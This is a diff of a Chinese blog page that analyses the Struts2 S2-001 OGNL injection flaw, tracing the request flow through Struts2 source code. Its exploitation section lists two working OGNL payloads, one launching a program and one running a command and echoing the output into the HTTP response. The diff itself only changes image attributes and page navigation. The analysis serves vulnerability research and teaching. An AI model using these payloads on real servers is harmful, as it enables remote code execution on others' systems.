 <p>但这里只是对一些数据进行操作，具体的业务逻辑我们进入invoke方法中查看</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743489792863-b5031d72-c556-4217-bd1c-0c7fa1e34a66.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743489792863-b5031d72-c556-4217-bd1c-0c7fa1e34a66.png" alt="Struts2-S2-001" loading="lazy"></p>
 <p>进入<code>invoke</code>方法后，在<code>interceptors.hasNext</code>判断中，使用迭代器进行顺序递归执行配置的所有拦截器，	所迭代的内容是Struts包中<code>default.xml</code>文件内配置的interceptors标签中的内容</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743490057576-1fbc3552-a31c-47de-b18c-33f7a90d1467.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743490057576-1fbc3552-a31c-47de-b18c-33f7a90d1467.png" alt="Struts2-S2-001" loading="lazy"></p>
 <p>在这么多拦截器中，<code>param</code>是用来处理我们输入的参数的，所有对于OGNL表达式的处理，应该在这个interceptor中，对于该漏洞的本质，其实就是在Struct2中哪个地方进行了OGNL表达式的解析操作</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743490436216-dd4ce8a9-a7f9-47cd-ab34-960ce5b755e8.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743490436216-dd4ce8a9-a7f9-47cd-ab34-960ce5b755e8.png" alt="Struts2-S2-001" loading="lazy"></p>
 <p>在迭代器处理完成后，我们就进入到了<code>invokeActionOnly</code>方法中</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743493436739-a64e0e71-7abc-434b-923f-96c2cb69fef0.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743493436739-a64e0e71-7abc-434b-923f-96c2cb69fef0.png" alt="Struts2-S2-001" loading="lazy"></p>
 <p>在<code>invokeActionOnly</code>方法中，调用了<code>invokeAction</code>方法，我们走进该方法中调试，发现最后经过反射调用<code>execute</code>方法，开始处理用户的逻辑信息</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">invokeActionOnly</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    	<span class="keyword">return</span> invokeAction(getAction(), proxy.getConfig());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743493608672-74519035-a447-4c5c-bd64-6d59829fdabd.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743493608672-74519035-a447-4c5c-bd64-6d59829fdabd.png" alt="Struts2-S2-001" loading="lazy"></p>
 <p>处理完用户逻辑后，我们步出该方法，继续向下走，最终跟进<code>executeResult()</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743493881368-7491aaf8-0e23-4842-9940-c3f798f57b01.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743493881368-7491aaf8-0e23-4842-9940-c3f798f57b01.png" alt="Struts2-S2-001" loading="lazy"></p>
 <p>首先用<code>creatResult</code>创建了一个result对象，主要逻辑肯定在<code>execute</code>方法内，继续跟进</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743493961354-33f9d879-49a0-43ef-89a6-c18a9327e171.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743493961354-33f9d879-49a0-43ef-89a6-c18a9327e171.png" alt="Struts2-S2-001" loading="lazy"></p>
 <p>走入<code>execute</code>方法中，继续走进<code>doExecute</code>方法内</p>
 <p>在<code>doExecute</code>方法内，准备了发送响应信息，设置了pageContext参数</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="built_in">this</span>.lastFinalLocation = <span class="built_in">this</span>.conditionalParse(<span class="built_in">this</span>.location, invocation);</span><br><span class="line">        <span class="built_in">this</span>.doExecute(<span class="built_in">this</span>.lastFinalLocation, invocation);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doExecute</span><span class="params">(String finalLocation, ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            log.debug(<span class="string">&quot;Forwarding to location &quot;</span> + finalLocation);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">PageContext</span> <span class="variable">pageContext</span> <span class="operator">=</span> ServletActionContext.getPageContext();</span><br><span class="line">        <span class="keyword">if</span> (pageContext != <span class="literal">null</span>) &#123;</span><br><span class="line">            pageContext.include(finalLocation);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ServletActionContext.getRequest();</span><br><span class="line">            <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> ServletActionContext.getResponse();</span><br><span class="line">            <span class="type">RequestDispatcher</span> <span class="variable">dispatcher</span> <span class="operator">=</span> request.getRequestDispatcher(finalLocation);</span><br><span class="line">            <span class="keyword">if</span> (dispatcher == <span class="literal">null</span>) &#123;</span><br><span class="line">                response.sendError(<span class="number">404</span>, <span class="string">&quot;result &#x27;&quot;</span> + finalLocation + <span class="string">&quot;&#x27; not found&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!response.isCommitted() &amp;&amp; request.getAttribute(<span class="string">&quot;javax.servlet.include.servlet_path&quot;</span>) == <span class="literal">null</span>) &#123;</span><br><span class="line">                request.setAttribute(<span class="string">&quot;struts.view_uri&quot;</span>, finalLocation);</span><br><span class="line">                request.setAttribute(<span class="string">&quot;struts.request_uri&quot;</span>, request.getRequestURI());</span><br><span class="line">                dispatcher.forward(request, response);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dispatcher.include(request, response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
@@ -290,17 +311,17 @@ OGNL支持直接使用表达式来创建对象，其中有三种情况
 
 <p>跟进<code>evaluateParams</code>方法，在该if判断中，因为altSyntax默认开启，所以走入if判断中</p>
 <p>将username拼接进<code>%&#123;&#125;</code>中，这里本意是想使用<code>%&#123;username&#125;</code>来获取域中的username参数，但是由于存在循环解析，使用造成了OGNL注入</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743495014666-0641ba73-a64c-4874-abbf-6a557cf9ec4a.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743495014666-0641ba73-a64c-4874-abbf-6a557cf9ec4a.png" alt="Struts2-S2-001" loading="lazy"></p>
 <p>我们继续看到<code>findValue</code>方法中，进行寻找值的操作，并继续走入<code>translateVariables</code>方法</p>
 <p>在这里，会将拼接好的<code>%&#123;username&#125;</code>中的<code>%&#123;</code>和<code>&#125;</code>截取，只剩下username</p>
 <p>然后使用findValue方法，将我们所输入的username查找出来并赋值给o，也就是我们输入的<code>%&#123;10*10&#125;</code>，然后进行新的一次循环，将我们输入的东西再次当成OGNL表达式解析，就造成了此漏洞</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743495489057-a8ca10ec-e472-4358-9100-90c800e3e5d8.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743495489057-a8ca10ec-e472-4358-9100-90c800e3e5d8.png" alt="Struts2-S2-001" loading="lazy"></p>
 <h3 id="RyS8z">漏洞利用</h3>
 漏洞利用基于上述的OGNL表达式
 
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)).start()&#125;</span><br><span class="line"></span><br><span class="line">%&#123;#a=(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;clac&quot;</span>&#125;)).redirectErrorStream(<span class="literal">true</span>).start(),#b=#a.getInputStream(),#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#b),#d=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#c),#e=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],#d.read(#e),#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.getWriter().println(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743474566019-267cfed1-1471-4458-b677-6f238a1af9bf.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743474566019-267cfed1-1471-4458-b677-6f238a1af9bf.png" alt="Struts2-S2-001" loading="lazy"></p>
 <h3 id="lc9Hh">漏洞修复</h3>
 通过漏洞分析可以看到，是由于 struts2 错误的使用了递归循环来进行OGNL表达式的解析，所导致的OGNL表达式的执行
 
@@ -328,13 +349,13 @@ OGNL支持直接使用表达式来创建对象，其中有三种情况
   <nav class="frame post-navigation" aria-label="相邻文章">
     
       <a href="/2025/04/16/Java%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/">
-        <span>← PREVIOUS</span>
+        <span>更新一篇</span>
         <strong>Java回显技术</strong>
       </a>
     
     
-      <a href="/2025/04/06/SnakeYaml%E9%93%BE/">
-        <span>NEXT →</span>
+      <a class="post-navigation__older" href="/2025/04/06/SnakeYaml%E9%93%BE/">
+        <span>更早一篇</span>
         <strong>SnakeYaml链</strong>
       </a>
     
@@ -348,9 +369,9 @@ OGNL支持直接使用表达式来创建对象，其中有三种情况
       <a href="/">CURLYSEAN</a>
       <span>持续记录，保持验证。</span>
     </div>
-    <p class="site-footer__copyright">© 2026 CurlySean</p>
+    <p class="site-footer__copyright">© 2025–2026 CurlySean</p>
     <nav class="site-footer__links" aria-label="外部链接">
-      <a href="https://github.com/CurlySean" target="_blank" rel="noopener">GitHub ↗</a>
+      <a href="https://github.com/CurlySean" target="_blank" rel="noopener noreferrer">GitHub ↗</a>
       <a href="mailto:5345414e@gmail.com">Email ↗</a>
     </nav>
   </div>
